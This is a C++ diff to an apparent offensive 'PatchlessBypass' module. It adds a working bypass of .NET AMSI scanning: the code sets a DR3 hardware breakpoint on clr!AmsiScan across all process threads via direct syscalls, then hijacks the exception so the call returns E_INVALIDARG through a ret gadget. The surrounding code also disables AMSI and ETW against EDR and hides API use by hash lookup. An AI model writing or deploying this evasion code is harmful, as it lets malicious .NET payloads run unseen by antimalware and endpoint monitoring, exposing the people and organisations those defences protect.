@@ -20,14 +20,20 @@ namespace PatchlessBypass
     static PVOID  s_AmsiAddr     = nullptr;   // amsi!AmsiScanBuffer
     static PVOID  s_EtwAddr      = nullptr;   // ntdll!EtwEventWrite
     static PVOID  s_EtwExAddr    = nullptr;   // ntdll!EtwEventWriteEx
+    static PVOID  s_ClrAmsiAddr  = nullptr;   // clr!AmsiScan (DR3)
     static void*  s_RetGadget    = nullptr;   // C3 (ret) в ntdll
     static bool   s_Active       = false;
+    static bool   s_ClrAmsiActive = false;
 
     // ═══ Multi-thread DR7: TID storage for cleanup ═══
     // Hardware breakpoints are per-thread. EDR callback threads
     // need DR0-DR2 set too, not just the main thread.
     static DWORD  s_ThreadIds[256];
     static DWORD  s_ThreadCount  = 0;
+
+    // CLR AMSI bypass: separate TID list for DR3 management
+    static DWORD  s_ClrAmsiThreadIds[256];
+    static DWORD  s_ClrAmsiThreadCount = 0;
 
     // ═══ NtQuerySystemInformation structures (internal) ═══
     typedef struct _SYSTEM_THREAD_INFORMATION {
@@ -287,6 +293,14 @@ namespace PatchlessBypass
             return EXCEPTION_CONTINUE_EXECUTION;
         }
 
+        // CLR AMSI: clr!AmsiScan → E_INVALIDARG (bypass .NET assembly scanning)
+        if (s_ClrAmsiAddr && ip == (ULONG_PTR)s_ClrAmsiAddr)
+        {
+            pExInfo->ContextRecord->Rax = 0x80070057;  // E_INVALIDARG
+            pExInfo->ContextRecord->Rip = (ULONG_PTR)s_RetGadget;
+            return EXCEPTION_CONTINUE_EXECUTION;
+        }
+
         return EXCEPTION_CONTINUE_SEARCH;
     }
 
@@ -391,5 +405,158 @@ namespace PatchlessBypass
     bool IsActive()
     {
         return s_Active;
+    }
+
+    // ═══ Set DR3 on a specific thread (for CLR AMSI bypass) ═══
+    static bool SetDr3OnThread(DWORD tid, PVOID clrAmsiAddr)
+    {
+        struct _OBJ_ATTR {
+            ULONG Length;
+            HANDLE RootDirectory;
+            void* ObjectName;
+            ULONG Attributes;
+            void* SecurityDescriptor;
+            void* SecurityQualityOfService;
+        } objAttr = { sizeof(_OBJ_ATTR), nullptr, nullptr, 0, nullptr, nullptr };
+
+        CLIENT_ID cid = {};
+        cid.UniqueProcess = (HANDLE)(ULONG_PTR)(DWORD)(ULONG_PTR)__readgsqword(0x40);
+        cid.UniqueThread  = (HANDLE)(ULONG_PTR)tid;
+
+        HANDLE hThread = nullptr;
+        NTSTATUS status = Syscall::NtOpenThread(&hThread, THREAD_ALL_ACCESS, &objAttr, &cid);
+        if (status != 0 || !hThread) return false;
+
+        CONTEXT ctx = {};
+        ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+
+        status = Syscall::NtGetContextThread(hThread, &ctx);
+        if (status != 0)
+        {
+            Syscall::NtClose(hThread);
+            return false;
+        }
+
+        ctx.Dr3 = (ULONG_PTR)clrAmsiAddr;
+        ctx.Dr7 |= (1 << 6);  // DR3 enable bit
+
+        ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+        status = Syscall::NtSetContextThread(hThread, &ctx);
+
+        Syscall::NtClose(hThread);
+        return status == 0;
+    }
+
+    // ═══ Clear DR3 on a specific thread ═══
+    static bool ClearDr3OnThread(DWORD tid)
+    {
+        struct _OBJ_ATTR {
+            ULONG Length;
+            HANDLE RootDirectory;
+            void* ObjectName;
+            ULONG Attributes;
+            void* SecurityDescriptor;
+            void* SecurityQualityOfService;
+        } objAttr = { sizeof(_OBJ_ATTR), nullptr, nullptr, 0, nullptr, nullptr };
+
+        CLIENT_ID cid = {};
+        cid.UniqueProcess = (HANDLE)(ULONG_PTR)(DWORD)(ULONG_PTR)__readgsqword(0x40);
+        cid.UniqueThread  = (HANDLE)(ULONG_PTR)tid;
+
+        HANDLE hThread = nullptr;
+        NTSTATUS status = Syscall::NtOpenThread(&hThread, THREAD_ALL_ACCESS, &objAttr, &cid);
+        if (status != 0 || !hThread) return false;
+
+        CONTEXT ctx = {};
+        ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+
+        status = Syscall::NtGetContextThread(hThread, &ctx);
+        if (status != 0)
+        {
+            Syscall::NtClose(hThread);
+            return false;
+        }
+
+        ctx.Dr3 = 0;
+        ctx.Dr7 &= ~(1 << 6);  // DR3 disable bit
+
+        ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+        status = Syscall::NtSetContextThread(hThread, &ctx);
+
+        Syscall::NtClose(hThread);
+        return status == 0;
+    }
+
+    // ═══ Enable CLR AMSI Bypass — DR3 on clr!AmsiScan ═══
+    bool EnableClrAmsiBypass()
+    {
+        if (s_ClrAmsiActive) return true;
+        if (!s_RetGadget) return false;   // Need ret gadget from main Enable()
+
+        // Resolve clr.dll — it should already be loaded by CLR init
+        HMODULE hClr = Api::GetModuleByHashCrc(Crc32C::ConstHash("clr.dll"));
+        if (!hClr)
+        {
+            // Try loading it explicitly
+            HMODULE hK32 = Api::GetModuleByHashCrc(Api::CrcMod::KERNEL32);
+            if (hK32)
+            {
+                auto pLL = (HMODULE(WINAPI*)(LPCWSTR))
+                    Api::GetProcByHashCrc(hK32, Api::CrcFn::LoadLibraryW);
+                if (pLL)
+                {
+                    wchar_t clrStr[] = { 'c','l','r','.','d','l','l', 0 };
+                    hClr = pLL(clrStr);
+                }
+            }
+        }
+
+        if (!hClr) return false;
+
+        // Find clr!AmsiScan
+        constexpr DWORD hashAmsiScan = Crc32C::ConstHash("AmsiScan");
+        s_ClrAmsiAddr = (PVOID)Api::GetProcByHashCrc(hClr, hashAmsiScan);
+        if (!s_ClrAmsiAddr) return false;
+
+        // Set DR3 on current thread
+        if (!SetDr3OnThread((DWORD)(ULONG_PTR)__readgsqword(0x48), s_ClrAmsiAddr))
+        {
+            s_ClrAmsiAddr = nullptr;
+            return false;
+        }
+
+        // Set DR3 on all other process threads
+        s_ClrAmsiThreadCount = 0;
+        EnumerateProcessThreads((DWORD)(ULONG_PTR)__readgsqword(0x40),
+            s_ClrAmsiThreadIds, &s_ClrAmsiThreadCount, 256);
+
+        for (DWORD i = 0; i < s_ClrAmsiThreadCount; i++)
+        {
+            if (s_ClrAmsiThreadIds[i] == (DWORD)(ULONG_PTR)__readgsqword(0x48)) continue;
+            SetDr3OnThread(s_ClrAmsiThreadIds[i], s_ClrAmsiAddr);
+        }
+
+        s_ClrAmsiActive = true;
+        return true;
+    }
+
+    // ═══ Disable CLR AMSI Bypass — clear DR3 ═══
+    void DisableClrAmsiBypass()
+    {
+        if (!s_ClrAmsiActive) return;
+
+        // Clear on current thread
+        ClearDr3OnThread((DWORD)(ULONG_PTR)__readgsqword(0x48));
+
+        // Clear on all other threads
+        for (DWORD i = 0; i < s_ClrAmsiThreadCount; i++)
+        {
+            if (s_ClrAmsiThreadIds[i] == (DWORD)(ULONG_PTR)__readgsqword(0x48)) continue;
+            ClearDr3OnThread(s_ClrAmsiThreadIds[i]);
+        }
+
+        s_ClrAmsiThreadCount = 0;
+        s_ClrAmsiAddr = nullptr;
+        s_ClrAmsiActive = false;
     }
 }
